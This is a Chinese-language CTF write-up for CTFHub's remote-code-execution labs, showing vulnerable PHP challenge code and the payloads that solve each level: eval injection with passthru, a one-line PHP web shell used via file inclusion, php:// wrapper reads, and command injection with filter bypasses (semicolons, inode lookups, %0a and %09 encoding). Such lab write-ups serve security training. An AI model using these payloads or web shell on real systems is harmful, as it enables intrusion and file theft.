---
title: CTFHub RCE
categories: ctf题目
---
![](https://img-blog.csdnimg.cn/20210312225826493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
---
## eval执行

```bash
<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>
```
payload:
```
 ?cmd=passthru("cat /f*"); 
```
Cat 替换为tac nl等  passthru替换为system

---
## 文件包含

![](https://img-blog.csdnimg.cn/20210312225956810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

 ### 文件包含
```bash
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```

```
 如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。
```

Shell.txt: <?php eval($_REQUEST['ctfhub']);?>

Payload: 
```
 ?file=shell.txt&ctfhub=passthru("tac /f*");
```

---
### php://input

```bash
<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

```

![](https://img-blog.csdnimg.cn/20210312230300261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
### 读取源代码

```bash
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```
Payload：
```
 ?file=php://filter/read/resource=/flag
```

---
### 远程包含

```bash
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```
payload1：
```
 php://input
```

payload2:
```
 apache服务
```

---
## 命令注入
![](https://img-blog.csdnimg.cn/20210312230620561.png#pic_center)

### 命令注入

```bash
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}

```

![](https://img-blog.csdnimg.cn/20210312230649827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210312230714783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210312230739585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查看源码即可

---
### 过滤cat
Tac nl more less替代

---
### 过滤空格

![](https://img-blog.csdnimg.cn/20210312230957818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
### 过滤目录分隔符 /

利用 `inode`

![](https://img-blog.csdnimg.cn/20210312231023326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
payload1 :
```
 ;ls -i
 ;cd `find -inum 397442`;ls -i
 ;cd `find -inum 397442`;ls -i;tac `find -inum 397443`
```

payload2:
```
 ;ls
 ;cd flag_is_here;ls
 ;cd flag_is_here;tac flag_233082532526797.php
```

---
### 过滤运算符
```bash
if (!preg_match_all("/(\||\&)/", $ip, $m)) {
```
过滤了 `| ，&` 而已
跟上面一样 `;`

---
### 综合过滤练习

```bash
 if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
```

![](https://img-blog.csdnimg.cn/20210312231421209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`%0a`绕过运算符

![](https://img-blog.csdnimg.cn/20210312231447697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`%0a 代替 换行` ， `%09 代替 TAB键` （因为flag被过滤了，所以我们通过TAB来补全flag_is_here）

 `%5c 代替 \`（用 \ 来分隔开 cat ，因为 cat 也被过滤了）

payload:
```
%0als#
%0acd%09*ag_is_here%0anl%09*ag_51091243123891.php#
```

 
